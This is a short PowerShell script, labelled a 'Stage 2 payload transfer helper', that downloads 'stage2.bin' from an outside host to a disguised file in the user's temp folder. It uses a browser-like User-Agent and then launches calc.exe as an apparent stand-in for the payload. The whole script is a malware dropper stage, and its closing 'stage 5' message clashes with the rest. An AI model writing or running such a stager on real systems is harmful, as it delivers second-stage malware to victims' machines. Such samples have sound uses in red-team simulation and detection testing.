
<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.
#>
$PayloadUrl = 'https://adatum.com:443/stage2.bin'
$OutputPath = "$env:TEMP\update.dat"
$RequestTimeout = 207
$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $OperationResult = Invoke-Stage2Download -SourceUrl $PayloadUrl -DestinationPath $OutputPath -TimeoutSec $RequestTimeout -UserAgent $RequestAgent
    if ($OperationResult) {
        Start-Process -FilePath "calc.exe"
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

Write-Output "stage 5 initialized"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
